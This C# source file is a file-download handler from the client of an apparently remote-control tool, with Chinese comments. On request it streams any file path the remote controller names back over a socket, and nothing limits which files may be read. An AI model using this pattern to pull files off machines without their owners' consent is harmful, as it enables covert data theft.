using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using System.Threading;
using System.IO;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    class RequestDownloadHandler : AbstractRequestHandler
    {
        private bool _isRunning = false;
        private RequestStartDownload _request = null;
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_START_DOWNLOAD_REQUEST)
            {
                // 开始
                RequestStartDownload req = reqObj as RequestStartDownload;
                if (_request == null)
                {
                    _request = req;
                    _isRunning = true;

                    // 返回文件基本信息
                    ResponseStartDownloadHeader headerResp = new ResponseStartDownloadHeader();
                    using (var fs = System.IO.File.OpenRead(req.Path))
                    {
                        headerResp.FileSize = fs.Length;
                        headerResp.Path = req.Path;
                        headerResp.SavePath = req.SavePath;
                    }
                    session.Send(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, headerResp);
                    // 开始返回文件内容
                    RunTaskThread(StartDownload, session);
                }
                else
                {
                    // 每次只能下载一个文件
                    return;
                }
            }
            else if (reqType == ePacketType.PACKET_STOP_DOWNLOAD_REQUEST)
            {
                // 停止
                _isRunning = false;
            }
        }

        private void StartDownload(SocketSession session)
        {
            FileStream fs = new FileStream(_request.Path, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[2048];
            while (true)
            {
                if (!_isRunning)
                {
                    break;
                }
                int size = fs.Read(buffer, 0, buffer.Length);
                if (size < 1)
                    break;

                ResponseStartDownload resp = new ResponseStartDownload();
                resp.Data = new byte[size];
                for (int i = 0; i < size; i++)
                {
                    resp.Data[i] = buffer[i];
                }
                session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, resp);
            }
            fs.Close();
            _request = null;
            _isRunning = false;
        }
    }
}
